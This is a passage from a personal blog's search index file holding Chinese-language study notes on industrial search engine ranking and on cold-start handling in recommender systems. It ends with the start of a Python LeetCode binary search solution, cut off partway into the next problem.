<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>工业界搜索引擎-1</title>
      <link href="/2024/06/23/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E-1/"/>
      <url>/2024/06/23/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E-1/</url>
      
        <content type="html"><![CDATA[<p>搜索引擎更像是NLP和推荐系统的结合, 在这之前我在两边都有一些基础, 所以这里再来学习一下搜推里面的搜索相关.</p><h1 id="background">Background</h1><h2 id="data">data</h2><ul><li><p>文档点击: 文档曝光之后用户有点击.<br /></p></li><li><p>文档点击率: 文档点击总次数/文档曝光总次数. (10%左右)</p></li><li><p>查询词点击: 用户对搜索引擎返回的文档有点击.<br /></p></li><li><p>查询词点击率(有点比): 查询次点击总次数/搜索总次数. (70%左右)</p></li><li><p>查询词首屏点击: 用户点击搜索结果页首屏的任意文档就算"查询词首屏点击".<br /></p></li><li><p>查询词首屏点击率(首屏有点比): 查询词首屏点击率/搜索总次数. (60%左右)</p></li></ul><p>在对搜索引擎的评价指标里面, 有点比会比文档点击率更重要.</p><h2 id="垂搜和通搜">垂搜和通搜</h2><h3 id="垂搜">垂搜</h3><p>垂搜即针对某个行业的搜索引擎, 比如:</p><ul><li>电商: 淘宝, 京东, amazon等<br /></li><li>学术: Google Scholar, 知网等<br /></li><li>本地生活: 美团, 饿了吗, 大众点评等<br /></li><li>酒店机票: Booking, 美团, 携程, 东航等<br /></li><li>招聘: LinkedIn, Boss直聘等</li></ul><p>垂搜的文档相对结构化:</p><p>比如电商可以限定品牌, 卖家, 价格, 颜色等; 学术可以指定关键词, 作者, 期刊, 年份等.</p><p>同时垂搜一般用户目的明确:</p><p>比如饿了吗搜火锅肯定是找火锅店, 如果Boss直聘搜火锅则是找餐饮行业的工作相关.</p><h3 id="通搜">通搜</h3><ul><li><p>覆盖面广, 并不限单个领域, 比如: Google, Baidu, 必应, 抖音等</p></li><li><p>在这些搜索引擎中, 文档来源广, 覆盖面大(比如google就会提供链接, 图片, 视频, 新闻等相关信息作为返回).</p></li><li><p>没有结构化信息, 检索难度很大.</p></li><li><p>用户使用通搜的目的不同, 很难判断用户的目的.</p></li></ul><h2 id="用户满意度">用户满意度</h2><p>对于搜索引擎至关重要, 只有了解了用户对搜索引擎的评判标准我们才能更好地设计和改进搜索引擎.</p><p>业界的共识: 相关性, 内容质量, 时效性是影响用户满意度的三大因素.</p><p>对某些搜素引擎而言: 个性化, 地域性也会影响用户满意度.</p><p>通用搜索引擎迭代优化的目标是让用户更满意.</p><h3 id="相关性">相关性</h3><ul><li>相关性是查询词q和文档d两者的关系.<br /></li><li>相关性是<strong>客观标准</strong>, 不取决于用户.(大多数有背景知识的人认为相关则判定为相关)<br /></li><li>相关性是语义上的而不是字面上的.(相关即d能够满足q的需求或提问, 而不一定必须包含q)<br /></li><li>q可能有多重含义, 而d只需要命中其中一种主要意图, 则可以算作(q, d)相关.</li></ul><p>搜索引擎和推荐系统链路类似, 也有召回,粗排,精排.</p><p>召回完成之后, 候选文档量级为数万, 召回海选阶段用文本匹配分数或者双塔bert等模型粗略计算相关性.</p><p>粗排阶段候选文档数量为数千, 可以用双塔bert模型或者浅层交叉bert模型计算相关性.</p><p>精排阶段候选文档量级为百, 可以用交叉bert计算相关性.</p><h3 id="内容质量">内容质量</h3><h4 id="网站和作者的质量">网站和作者的质量</h4><p>主要评判标准为Google提出的EAT.</p><ul><li>专业性(Expertise): 作者是否有专业资格, 比如搜治病相关, 搜索引擎给的回答是否是来自医生的回答.<br /></li><li>权威性(Authoritativeness): 作者或者网站机构是否具有权威性, 不会被用户质疑, 比如你搜某个学校, 搜索引擎给你的应该是学校的官网,学校的Twitter或者wiki, 而不应该是留学中介.<br /></li><li>可信赖(Trustworthiness): 作者或者网站的名声, 比如找某个诊所, 那么google地图,或者大众点评这种平台上面的评价都是可以信任的评价.</li></ul><p>EAT在排序阶段也可以作为重要因子, 比如对于your money or your life这类query.</p><p><strong>Your Money</strong>:<br />- 金融理财(保险, 投资, 保税, 贷款, 转账).<br />- 电商, 购物.</p><p><strong>Your Life</strong>:<br />- 医疗健康(诊断建议, 用药建议, 医院介绍等)<br />- 法律等严肃主题(诉讼, 移民, 选举, 离婚, 收养)<br />- 对人生有重大影响的主题(高考, 择校, 出国, 就业)</p><p>对于这类问题, 搜索引擎应该给EAT很高的权重, 否则的话搜索引擎不仅仅在影响用户的体验和主观感受, 甚至会危害社会.</p><p>传统网络挖掘里面的PageRank的打分策略其实是基于网站之间的链接关系, 网站链接得越多分数就越高, 这其实也是一种权威性打分的例子.</p><h4 id="文本质量">文本质量</h4><p><strong>文字的质量</strong>: 文章写得好不好</p><ul><li>文章的价值: 文章是否清晰, 全面, 事实是否准确, 信息是否有用.<br /></li><li>作者的态度和水平: 写作是否认真, 写作的专业程度, 写作的技巧等.</li></ul><p>然后针对用户不同的目的, 文本质量判定都有所不同:</p><p>比如我要找宠物饲养, 那么注意事项是否讲解清楚, 是否事实正确, 对作者是否有价值就是判定点; 我要找笑话, 那么笑话是否新颖好笑就是判定点; 我要找影评, 那么影评是否清晰全面有深度就是判定点.</p><p><strong>文章的意图</strong>: 文章的目的是有利的还是有害的</p><p>比如一篇文章目的是诈骗, 那么哪怕它写得再好它也是有害的.</p><ul><li>有利的: 分享有用的知识, 攻略, 亲身经历等.<br /></li><li>有害的: 虚假信息, 广告, 散播仇恨, 男女对立等.</li></ul><p>标题党, 图文不一致, 虚假引流标签, 堆叠关键词等. 这些按一般常理来说是应该被判定为低质量并被搜索引擎打压的.</p><p><img src="content_quality.png" /></p><p><strong>需要注意文本质量不是一个分数, 而是很多个分数</strong>, 它们一起在搜索引擎里起作用.</p><p>对于其中每一个文本质量分数, 都有一个专门训练的模型, 比如BERT等NLP模型, CLIP等多模态模型.</p><p>然后文本分数都是静态的, 算一次即可, 在文章发布的时候或者检索的时候打分然后分数存入文档画像, 在之后搜索排序的时候直接从画像中读取分数即可.</p><h3 id="时效性">时效性</h3><p>文档的年龄在排序中有多大作用? 这个很大程度取决于查询词. 时效性一般被分类为: 突发时效性, 一般时效性(强/中/弱/无), 周期时效性.</p><ul><li>query = "最新房贷政策", "美元汇率" 这种就需要很强的时效性<br /></li><li>query = "泰国旅游"这种类似的旅游餐饮行业就不需要很强的时效性, 但最好也是1年内的.<br /></li><li>query = "搞笑萌宠"这种宠物相关, 又或者是疾病相关这种知识性的信息就完全不需要时效性</li></ul><p>搜索引擎主要用数据挖掘和语义模型来识别时效性意图.</p><h4 id="突发时效性">突发时效性</h4><p>查询词涉及突发的新闻和热点事件. 如果查询词带有突发时效性, 那么用户大概率想看到最新的文档.</p><p>比如德国足球一般时间被搜索可能是用户想要了解德国足球的现状, 如果欧洲杯期间被搜索肯定是大家想要了解最新的资讯. 又比如用户一般情况搜索明星大概率是想要了解这个梦想是谁做了什么事, 如果明星被爆出新闻用户再去搜那大概率是想看新闻相关.</p><p>识别的方法: 数据挖掘为主.</p><ul><li>挖掘站内搜索量激增的查询词(明星被爆出新闻, 肯定很多人去搜, 就会被数据挖掘系统检测到).<br /></li><li>挖掘站内发布量激增的关键词(出了某个大新闻, 肯定很多人会发布相关资讯赚流量, 就会导致发布内容大量包含关键词, 从而可以被检测到).<br /></li><li>爬取其他网站的热词(比如获取微博热搜, 搜索引擎就能知道最近什么东西收到用户的关注).</li></ul><p>人不可以预知未来, 所以这种信息人也无从判断, 因此深度学习模型不管用(比如bert), 数据挖掘的方式为首选.</p><h4 id="一般时效性">一般时效性</h4><p>只看查询词字面就可以判断时效性强弱, 一般被分为(强/中/弱/无)四档.</p><p>例: 某品牌薅羊毛, 黄金价格(强), 楼市新闻(中), 在美国更新中国护照, 相机测评(弱), 苏联笑话, 82版射雕(无).</p><p>这种信息人自身也能通过语义和常识判断, 所以我们也可以用语义模型进行判断. 即可以使用bert</p><h4 id="周期时效性">周期时效性</h4><p>在某个周期里面的特定时间表现出突发时效性, 其他时间无时效性.</p><p>比如高考, 春晚等.</p><p>可以不做处理, 一旦表现出了突发时效性会被数据挖掘检索到. 不过不做周期时效性特殊处理会导致系统慢半拍.</p><p>优化点可以是数据挖掘出周期时效性然后做相应处理.</p><h3 id="个性化">个性化</h3><p>不同用户可能有不同的偏好, 搜索引擎可以根据用户的特征做排序.</p><p>可以用<strong>预估点击率和交互率</strong>来衡量用户对文档的偏好, 即个性化.</p><p>最终模型会结合相关性, 内容质量, 时效性以及个性化等信息对候选文档进行排序.</p><p>个性化这个信息会在<strong>宽泛信息查询</strong>的时候很有用.</p><ul><li><p>查询词越宽泛, 就越需要个性化(查询宽泛, 返回的量就大, 比如搜索"头像", 其中只有小部分是用户感兴趣的; 如果查找精确, 那么信息大概率是用户感兴趣的, 比如"权力的游戏龙妈头像", 这种就可以不需要个性化).</p></li><li><p>预估点击率和交互率(即个性化)也有利于相关性和内容质量的提升.</p><ul><li>相关且高质量的文档更容易被点击.<br /></li><li>与bert等语义模型互补, 可以解决bad case的问题(如果搜索引擎返回bad case, 模型会判断返回具有低点击率可能, 从而pass掉).<br /></li><li>即使非个性化排序, 点击率和交互率也有助于提升排序效果.</li></ul></li></ul><h1 id="todo">TODO</h1><p>参考<a href="https://space.bilibili.com/1369507485">ShusenWang</a>的视频</p>]]></content>
      
      
      <categories>
          
          <category> ML Search Engine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工业界推荐系统相关(3)-冷启动</title>
      <link href="/2024/06/20/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3-3-%E5%86%B7%E5%90%AF%E5%8A%A8/"/>
      <url>/2024/06/20/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3-3-%E5%86%B7%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>UGC平台中用户可以自由发表内容, 如何对最新的内容做推荐就涉及到冷启动问题, UGC比PGC更难做冷启动, 因为内容量大且差异大.</p><p>出发的角度主要分为三部分: 用户侧(推荐), 作者侧(激励), 高热内容(发掘).</p><h1 id="为什么需要做冷启动">为什么需要做冷启动</h1><p>三方面原因:</p><ol type="1"><li>正常物品可以依赖用户点击信息作推荐, 而新发表内容缺少用户交互信息, 所以需要做特殊处理.<br /></li><li>对新发表内容做扶持可以增强作者发布意愿.<br /></li><li>为了发掘有潜力的内容</li></ol><p>所以冷启动的目标就是:</p><ol type="1"><li>精准推荐: 克服冷启动的困难, 把新内容推荐给用户的同时尽量保证不引起用户的反感.<br /></li><li>激励发布: 向低曝光的新物品倾斜流量, 从而激励作者的发布意愿.<br /></li><li>挖掘高潜: 小流量试探, 找到高质量的内容推荐给用户, 给予一部分流量倾斜.</li></ol><h1 id="评价指标">评价指标</h1><h2 id="作者侧指标">作者侧指标</h2><p>主要包括发布渗透率, 人均发布量</p><p>发布渗透率 = 当日发布人数 / 日活人数. (发布一篇以上都算一个发布人数.)</p><p>人均发布量 = 当日发布笔记数 / 日活人数</p><p>这些指标反映了作者发布积极性, 冷启的目标是促进发布从而扩大内容池.</p><p>新发布内容曝光越多, 交互越多, 作者积极性就更高.</p><h2 id="用户侧指标">用户侧指标:</h2><p>包括两个方面:</p><ol type="1"><li>新笔记指标: 点击率, 交互率<br /></li><li>大盘指标: 消费时长, 日活, 月活</li></ol><p>对于新笔记而言, 还是存在头部效应, 少量热门笔记会占据大多数曝光, 因此做推荐的时候最好进行分类考虑, 比如将高曝光笔记和低曝光笔记分开看, 高曝光笔记交互充足, 不需要冷启动也能推荐得好; 而低曝光笔记交互信息少, 推荐不够准, 因此需要特殊处理.</p><p>而对于大盘指标, 我们要做的就是做好作者侧激励的同时保证大盘指标的稳定.(过于扶持新用户会导致大盘指标降低, 而只关注大盘指标又很难扶持新用户).</p><h2 id="内容侧指标">内容侧指标:</h2><p>主要是高热笔记占比. 高热笔记占比越高, 说明冷启动挖掘优质笔记的能力越强, 即内容侧推荐做得越好.</p><h1 id="冷启动涉及的优化点">冷启动涉及的优化点</h1><ol type="1"><li>优化全链路(召回, 排序)<br /></li><li>流量调控(流量如何在新老物品之间分配)</li></ol><h2 id="召回通道冷启动">召回通道冷启动</h2><p>冷启动召回和传统召回有相同点也有不同点.</p><p><strong>相同点:</strong></p><ol type="1"><li>自带图片, 文字, 地点等.<br /></li><li>有算法或者人工标注的标签.</li></ol><p><strong>不同:</strong></p><ol type="1"><li>没有点击信息.<br /></li><li>缺少embedding信息(embedding一般是从用户和物品交互的过程中学习的, 而这里并没有学习到embedding信息).</li></ol><h3 id="itemcf不再适用">itemCF(不再适用)</h3><p>因此, 从这里可以看出, 由于缺少点击信息, itemCF不能够使用(itemCF:用户对物品j的喜欢程度可以通过用户对i的喜爱程度和物品ij之间的相似度来表示, 其中相似度由共同喜欢两个物品的用户数参与计算, 而新物品并没有交互信息, 因此itemCF不适用).</p><p><del>不过个人感觉似乎强行要用也不是不行, 相似度可以使用多模态模型获取图片文字信息, 然后不同笔记做内容相似度计算, 再通过用户喜欢过的笔记来寻找相似的新发布笔记做推荐. 可能工业界有自己的考量所以并不这么做.</del> 即聚类召回.</p><h3 id="双塔模型需要改进">双塔模型(需要改进)</h3><p>与此同时, 双塔模型我们又需要物品的embedding信息才能使用, 而这里我们看到其实是缺少embedding信息的, 所以我们需要对双塔模型进行修改, 具体的有两种方式.</p><ol type="1"><li>新笔记使用default embedding.</li></ol><p>物品塔做推荐的时候让所有新笔记共享一个default embedding并用default embedding进行训练, 下一次训练再用训练好的embedding.</p><ol start="2" type="1"><li>使用相似物品的embedding.</li></ol><p>多模态模型获取图文内容表征为一个向量, 查找topk内容最相似的高曝光笔记(高曝光笔记的embedding学的更好, 所以优先使用), 然后得到的k个向量取平均即为新笔记的embedding.</p><h4 id="多召回池">多召回池</h4><p>对于新物品我们可以设置多个召回池, 从而让笔记有<strong>更多曝光机会</strong>.</p><p>比如我们分:</p><ul><li>1小时新笔记<br /></li><li>6小时新笔记<br /></li><li>24小时新笔记<br /></li><li>30天老笔记</li></ul><p>召回池可以独立区分不同时长的笔记, 即1小时新笔记中我们必定会曝光其中一部分, 而不是说1小时新笔记和30天笔记混一起然后可能1小时新笔记一篇都没曝光.</p><p>然后就是多召回池使用的是同一个双塔模型, 所以并不增加训练代价.</p><h3 id="类目召回以及关键词召回">类目召回以及关键词召回</h3><p>各个做推荐的公司都会记录用户的画像, 画像记录了用户感兴趣的类目和关键词.</p><p>做类目召回: 即系统维护一份类目到笔记的索引, 然后按照发布时间倒排(鼓励新笔记), 最后按照相应的索引召回笔记.</p><p>关键词召回和类目召回完全相似.</p><p><strong>缺点</strong>:</p><ol type="1"><li>只对新发布的笔记有效: 因为只取回类目/关键词下面的最新的笔记, 一旦过了几个小时就再也没有机会召回.<br /></li><li>若个性化, 不够精准.</li></ol><p>缺点虽然明显, 但是还是很重要, 尤其对于促进作者发布的积极性.</p><h3 id="聚类召回">聚类召回</h3><p><strong>思路:</strong> 如果用户喜欢一篇笔记, 那么用户还可能喜欢与这篇笔记内容相似的笔记.</p><p><strong>做法:</strong></p><ol type="1"><li><p>事先训练一个神经网络, 基于笔记的图文内容将笔记映射到向量, 然后对笔记向量做聚类, 比如我们分出1000个cluster(K-Mean, 相似度可以用余弦相似度), 然后记录下每个cluster的中心.</p></li><li><p>从1000个中心向量里面找出最相似的向量作为新笔记的cluster.</p></li><li><p>把新笔记添加到cluster上, cluster到笔记列表是建立了索引的(按时间倒排).</p></li><li><p><strong>召回:</strong> 给定用户id, 找到用户的lastN交互, 然后将这些作为种子, 找到用户对哪些cluster感兴趣, 然后再从cluster中取回最新的m篇笔记. 最多共有m*n篇被召回.</p></li></ol><p><strong>图文转向量的模型</strong>:</p><p><img src="CNN+Bert.png" /></p><p>非常直观的CNN + Bert + FC层. 其中CNN和Bert都可以是预训练模型加上Finetuning, fc随机化权重然后进行学习.</p><p>学习过程中网络输出正样本笔记b+, 种子笔记a和负样本笔记b-, 然后我们鼓励 cosine(a, b+) &gt; cosine(a, b-). 比如我们可以用triplet hinge loss, 或者triplet logistic loss.</p><p><strong>正负样本选择</strong>:</p><p>正样本:</p><ol type="1"><li>使用人工标注的二元组的相似度.(代价大)<br /></li><li>算法自动选择正样本.</li></ol><p>筛选条件:</p><ul><li>只用高曝光笔记作为二元组(充足的用户交互信息, 算法选的会比较准).<br /></li><li>相同二级类目进行筛选, 从而避免完全不相关类目.<br /></li><li>最后用itemCF来进行筛选.</li></ul><p>负样本:</p><p>全体笔记里面选, 只要字数相对多, 笔记质量高, 避免图文无关即可.</p><h3 id="look-alike召回">Look-Alike召回</h3><p>Look-Alike起源于互联网广告, 即物品i的目标用户构成集合U, 那么所有和集合U内部用户相似的用户也可以被推荐.(个人理解类似userCF).</p><p>如果用户u对新发布的笔记有点击点赞收藏转发的行为, 则表示用户u对新笔记感兴趣, 那么我们就可以把用户u记为种子用户, 从而我们可以将新笔记推荐给所有与用户u相似的用户.</p><p>具体我们可以将种子用户的特征向量(可以复用双塔模型的用户向量)取均值得到一个向量, 将其作为新笔记的特征向量. (本质为使用相似用户的向量作为物品的特征, 方便后续做最近邻查找来召回)</p><p>这个向量需要做近线更新, 即不需要实时更新, 但是还是需要做分钟级更新. 每当有新的交互用户, 就需要将新用户的向量加入平均来更新向量.</p><p>然后实际场合我们需要将新笔记向量加入向量数据库, 然后每当用户刷新一下软件, 我们就对用户向量(复用双塔)做最近邻查找, 然后最近邻查找的返回就是Look-Alike的召回结果.</p><h2 id="流量调控">流量调控</h2><ol type="1"><li>推荐结果强插新笔记(较落后)<br /></li><li>对新笔记的分数做提权(boost)<br /></li><li>对新笔记做保量曝光(通过boost)<br /></li><li>在保量的基础上做差异化保量</li></ol><p>强插就字面意思, 每次曝光强行带入一个新笔记, 从而保证新笔记的曝光.</p><h3 id="分数提权">分数提权</h3><p>如果不做提权, 新老笔记权重相似, 则曝光率也类似, 从而新笔记曝光率低. 分数提权的本质是给新笔记提高权重(比如乘一个大于1的系数),目标是让新笔记有更多曝光机会.</p><p>做提权的阶段一般是粗排和重排.</p><p><strong>优点</strong>: 容易实现, 投入产出比好</p><p><strong>缺点</strong>: 曝光非常受提权系数影响, 一旦控制不好权重系数就会导致新笔记过度曝光或者曝光不足.</p><h3 id="新笔记保量">新笔记保量</h3><p>比如我们不管笔记质量高低, 在前24小时我们都给笔记100次曝光. 假如笔记前期曝光不足, 我们就给笔记更大的系数让它更容易曝光.</p><p><img src="保量.png" /></p><p>具体权重可能得在真正做保量的时候去仔细调.</p><h3 id="动态提权保量">动态提权保量</h3><p>基于目标曝光数, 目标时间以及已有曝光数和已经经过的时间来计算提权系数.</p><p>比如 $ 提权系数=f(, ) = f(0.5, 0.2) $</p><h4 id="保量的难点">保量的难点</h4><p>成功率低, 很多笔记前24小时曝光依然达不到100.</p><p>这可能是召回和排序存在不足(新笔记没有得到正确的预估分数), 也可能是权重没调好(分数差不多但是权重低了).</p><p><strong>需要注意的是</strong>: 线上环境的变化也会导致保量失败</p><p>比如线上环境的变化: 新增了召回通道, 排序模型有新的升级, 重排规则发生改变...</p><p>一旦线上环境发生改变, 我们都需要重新调整提权系数.</p><p><strong>思考题</strong>: 可不可以强行提高新笔记权重从而完成保量的目标呢?(比如我们给新笔记权重全部乘以4)</p><p>答: 非常直观的思考, 即直接高权重提权是否可行. 答案当然是否定的, 这样不管用户是谁, 物品都会被推荐(相当于重排阶段强插新笔记), 一方面新笔记点击点赞不太行, 其次就是即使是热门笔记, 被不喜欢的用户占用了曝光次数也可能因此被埋没.</p><p>因此合适的权重才是好的, 合适的权重才能让曝光次数被喜欢的用户占用, 并且尽量保证能够让新笔记得到更多曝光.</p><h3 id="差异化保量">差异化保量</h3><p>传统保量: 不管笔记内容是什么, 我们都做扶持, 比如让其在前24小时获得100次曝光.</p><p>差异化保量: 不同笔记不同保量目标, 比如普通笔记我们保量让其前24小时获得100次曝光, 对于热门笔记我们可以设置更高的数值, 比如前24小时获得500次曝光(算法判定)</p><p>具体可以用相应特征决定, 比如:</p><ul><li>基础保量: 所有笔记保量24小时100次曝光.<br /></li><li>内容保量: 比如我们可以用多模态神经网络对内容打分, 对优质内容给予额外保量目标, 上限加200.<br /></li><li>作者质量: 根据作者历史的笔记质量, 给予额外保量目标, 上限是加200次曝光.</li></ul><p>这样的策略可以保证新笔记最低有100次曝光, 最多可以有500次曝光.</p><p>最后, 按up的说法, 保量很难做, 并且up特意提及了数据非真实数据, 且做保量有很多坑. 我估计应该就是参数难调, 比如差异化保量的数值上限应该怎么设置, 每个部分又该设置多少, 基础曝光又多少合适, 这种应该都得纳入考虑.</p><h2 id="ab测试">AB测试</h2><p>冷启动的AB测试比之前要复杂很多, 涉及到几方面的东西.</p><ol type="1"><li>传统的AB测试只需要用户分实验组和对照组, 判断对全体笔记的点击指标和大盘指标即可.<br /></li><li>冷启动的AB测试涉及到老笔记和新笔记两部分, 而新笔记和老笔记之前存在抢流量的现象(新笔记曝光多了,老笔记曝光就少了).<br /></li><li>开对新笔记的测试, 必须要将新笔记分实验组和对照组, 而新笔记之间也存在抢流量现象(假如用户不分组, 用户实验组的曝光高了, 对照组的曝光就低了).<br /></li><li>如果对用户限定内容池, 比如实验组用户只能看到实验组新笔记, 那么相当于新笔记内容池少了一半, 会影响公司业务; 同样假如我们还对老笔记分实验组和对照组, 那么老笔记的池子也会减半, 非常影响业务.</li></ol><h3 id="用户侧实验以及存在的问题">用户侧实验以及存在的问题</h3><p>用户侧主要关注点击率相关, 所以直观来说我们只需要将用户分两组, 然后用不同的推荐方式给实验组和对照组的用户做推荐即可.</p><p><img src="userAB.png" /></p><p><strong>缺点</strong>:</p><p>假设前提: 新笔记保量100次曝光, 新笔记曝光越多, 用户使用APP时间越少(推荐效果变差了).</p><p>实验组: 我们在排序的时候, 将新笔记权重乘以2.</p><p>对照组: 保持不变</p><p>结果: 用户体验降低, diff为负数(负数正常, 因为扶持新笔记本身就会导致指标一定程度的下降).</p><p>然而我们将实验推全以后, 发现diff变小了(比如-2%变成-1%).</p><p>个人理解: 原因是在实验中我们提高了实验组的权重, 导致实验组更容易看到新笔记, 从而导致指标降低更厉害; 而对照组则影响偏小, 极端情况是实验组抢光了流量, 从而对照组不受影响最终指标持平. 这就导致AB测试导致的diff非常大(表面上看起来就是新策略过差而老策略优秀, 差值大). 而一旦我们推全了结果, 由于曝光数固定, 流量均分给了所有用户, 所以新策略效果没有实验中那么差(100条新笔记推给100个人会导致效果很差, 但是推给一万个人其实每个人曝光只有0.01篇, 效果就没那么差), 这种情况下老策略还是被抢流量所以指标几乎持平, 因此体感来看推全以后diff会变小.</p><h3 id="作者侧实验">作者侧实验</h3><p>方案1:</p><p><img src="authorAB_1.png" /></p><p>前提: 固定新老笔记走各自的队列, 没有竞争; 重排给新笔记1/3流量, 老笔记2/3流量.</p><p>新策略将新笔记权重乘以2.</p><p>从作者侧指标来看, 只看结果可能AB测试中实验组优于对照组; 但是推全之后发现diff会变小或消失.</p><p>缺陷:</p><ol type="1"><li><p>新笔记之间会抢流量, 实验组加了权重, 从而导致实验组结果高于正常值; 对照组被抢了流量, 导致结果低于正常值, 推全之后都恢复正常水平, 就会导致diff变小甚至消失.</p></li><li><p>新老笔记也会抢流量. 比如实验中50%新笔记和100%老笔记做流量竞争, 推全以后则是100%新笔记和100%老笔记做竞争. up这里说的是实验中1篇新笔记抢2篇老笔记流量, 推全1篇新笔记抢一篇流量, 因此更难推广, 所以实验中有指标提升推全之后可能并没有.</p></li></ol><p>方案2:</p><p><img src="authorAB_2.png" /></p><p>优点: 避免了新笔记之间的抢流量.</p><p>缺点:</p><ol type="1"><li><p>用户组里面可以看到的新笔记池子减半, 会影响公司业务.</p></li><li><p>依旧存在新老笔记抢流量现象.</p></li></ol><p>方案3:</p><p><img src="authorAB_3.png" /></p><p>全部开实验组和对照组, 结果完全可信, 但是用户现在老笔记的内容池也减半了, 严重影响了公司业务, 不可取.</p><h4 id="ab测试总结">AB测试总结</h4><p>目的是为了观测冷启动处理策略对指标的影响, 实验设计方面总的来说涉及几个问题:</p><ol type="1"><li>新笔记之间抢流量<br /></li><li>新老笔记抢流量<br /></li><li>内容池变小影响业务</li></ol><p>这里个人思考的话感觉可以针对前面偏大偏小的情况做纠偏处理, 比如针对抢流量现象按曝光比例做权重处理, 完成纠偏的话可信度应该有所提升. 不过不知道工业级会如何考量.</p><h2 id="todo">TODO</h2><p>余下内容为提升指标相关, 暂时不做学习.</p>]]></content>
      
      
      <categories>
          
          <category> ML Recommender System </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DSA-binary search</title>
      <link href="/2024/06/16/DSA-binary-search/"/>
      <url>/2024/06/16/DSA-binary-search/</url>
      
        <content type="html"><![CDATA[<p>一般来说二分都可以用复杂度偏高的做法简单地实现, 比如O(n)的遍历; 但是如何把n变成logn其实很锻炼思维, 所以也记录一下.</p><h1 id="median-of-two-sorted-arrays">4. Median of Two Sorted Arrays</h1><p>两个排序好的列表,求两个列表合并后的中位数.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums1 = [1,3], nums2 = [2]</span><br><span class="line">    Output: 2.00000</span><br><span class="line">    Explanation: merged array = [1,2,3] and median is 2.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums1 = [1,2], nums2 = [3,4]</span><br><span class="line">    Output: 2.50000</span><br><span class="line">    Explanation: merged array = [1,2,3,4] and median is (2 + 3) / 2 = 2.5.</span><br></pre></td></tr></table></figure><ol type="1"><li>需要注意中位数永远可以用 <code>(nums[(n-1)//2] + nums[n//2]) / 2</code> 表示<br /></li><li>L1和R2不交叉或者L2与R1不交叉的情况下我们缩区间<br /></li><li>交叉的时候我们返回L的最大值和R的最小值的均值</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMedianSortedArrays</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">        n1 = <span class="built_in">len</span>(nums1)</span><br><span class="line">        n2 = <span class="built_in">len</span>(nums2)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># mid1一开始是末尾, 如果n2 &lt; n1可能会溢出,得额外处理</span></span><br><span class="line">        <span class="comment"># 举例: [1,2,6,7,8,9,10], [3,4]</span></span><br><span class="line">        <span class="keyword">if</span> n2 &lt; n1:</span><br><span class="line">            <span class="keyword">return</span> self.findMedianSortedArrays(nums2, nums1)</span><br><span class="line"></span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = n1 * <span class="number">2</span></span><br><span class="line">        MIN = <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)</span><br><span class="line">        MAX = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid1 = l + (r-l) // <span class="number">2</span></span><br><span class="line">            mid2 = n1 + n2 - mid1</span><br><span class="line"></span><br><span class="line">            L1 = nums1[(mid1-<span class="number">1</span>)//<span class="number">2</span>] <span class="keyword">if</span> mid1 &gt; <span class="number">0</span> <span class="keyword">else</span> MIN</span><br><span class="line">            R1 = nums1[mid1//<span class="number">2</span>] <span class="keyword">if</span> mid1//<span class="number">2</span> &lt; n1 <span class="keyword">else</span> MAX</span><br><span class="line"></span><br><span class="line">            L2 = nums2[(mid2-<span class="number">1</span>)//<span class="number">2</span>] <span class="keyword">if</span> mid2 &gt; <span class="number">0</span> <span class="keyword">else</span> MIN</span><br><span class="line">            R2 = nums2[mid2//<span class="number">2</span>] <span class="keyword">if</span> mid2//<span class="number">2</span> &lt; n2 <span class="keyword">else</span> MAX</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> L1 &gt; R2:</span><br><span class="line">                r = mid1 - <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> L2 &gt; R1:</span><br><span class="line">                l = mid1 + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="built_in">max</span>(L1,L2) + <span class="built_in">min</span>(R1,R2)) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h1 id="search-in-rotated-sorted-array">33. Search in Rotated Sorted 